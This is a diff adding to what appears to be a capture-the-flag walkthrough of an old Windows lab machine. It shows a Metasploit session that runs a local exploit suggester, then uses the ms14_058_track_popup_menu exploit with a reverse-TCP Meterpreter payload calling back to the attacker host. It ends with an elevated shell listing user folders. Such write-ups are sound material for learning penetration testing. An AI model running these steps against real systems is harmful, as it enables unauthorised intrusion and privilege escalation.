@@ -356,3 +356,120 @@ msf6 exploit(multi/handler) > run
 [*] Sending stage (175686 bytes) to 10.10.10.15
 [*] Meterpreter session 1 opened (10.10.14.10:443 -> 10.10.10.15:1031) at 2023-09-25 16:50:33 +0530
 ```
+
+Search Expolits
+```shell
+msf6> background
+[*] Backgrounding session 1..
+msf6 exploit(multi/handler) > search local_exploit_suggester
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank    Check  Description
+   -  ----                                      ---------------  ----    -----  -----------
+   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester
+
+
+Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester
+
+msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
+msf6 post(multi/recon/local_exploit_suggester) > set session 1
+session => 1
+msf6 post(multi/recon/local_exploit_suggester) > run
+
+[*] 10.10.10.15 - Collecting local exploits for x86/windows...
+[*] 10.10.10.15 - 186 exploit checks are being tried...
+[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+[*] Running check method for exploit 41 / 41
+[*] 10.10.10.15 - Valid modules for session 2:
+============================
+
+ #   Name                                                           Potentially Vulnerable?  Check Result
+ -   ----                                                           -----------------------  ------------
+ 1   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
+ 2   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
+ 3   exploit/windows/local/ms14_070_tcpip_ioctl                     Yes                      The target appears to be vulnerable.
+ 4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
+ 5   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
+ 6   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
+ 7   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
+ 8   exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
+ 9   exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
+ 10  exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.
+
+<-- SNIP -->
+
+[*] Post module execution completed
+msf6 post(multi/recon/local_exploit_suggester) >
+```
+
+Exploit
+```shell
+msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms14_058_track_popup_menu
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/ms14_058_track_popup_menu) > options
+
+Module options (exploit/windows/local/ms14_058_track_popup_menu):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.1.27     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/local/ms14_058_track_popup_menu) > set session 1
+session => 1
+msf6 exploit(windows/local/ms14_058_track_popup_menu) > set lhost 10.10.14.10
+lhost => 10.10.14.10
+msf6 exploit(windows/local/ms14_058_track_popup_menu) > set lport 4444
+lport => 4444
+
+msf6 exploit(windows/local/ms14_058_track_popup_menu) > run
+
+[*] Started reverse TCP handler on 10.10.14.10:4444 
+[*] Reflectively injecting the exploit DLL and triggering the exploit...
+[*] Launching msiexec to host the DLL...
+[+] Process 2504 launched.
+[*] Reflectively injecting the DLL into 2504...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Sending stage (175686 bytes) to 10.10.10.15
+[*] Meterpreter session 2 opened (10.10.14.10:4444 -> 10.10.10.15:1032) at 2023-09-25 17:04:16 +0530
+
+meterpreter > ls
+Listing: c:\Documents and Settings
+==================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+040777/rwxrwxrwx  0     dir   2017-04-13 00:18:10 +0530  Administrator
+040777/rwxrwxrwx  0     dir   2017-04-12 19:33:34 +0530  All Users
+040777/rwxrwxrwx  0     dir   2017-04-12 19:34:48 +0530  Default User
+040777/rwxrwxrwx  0     dir   2017-04-13 00:49:46 +0530  Lakis
+040777/rwxrwxrwx  0     dir   2017-04-12 19:38:32 +0530  LocalService
+040777/rwxrwxrwx  0     dir   2017-04-12 19:38:31 +0530  NetworkService
+```
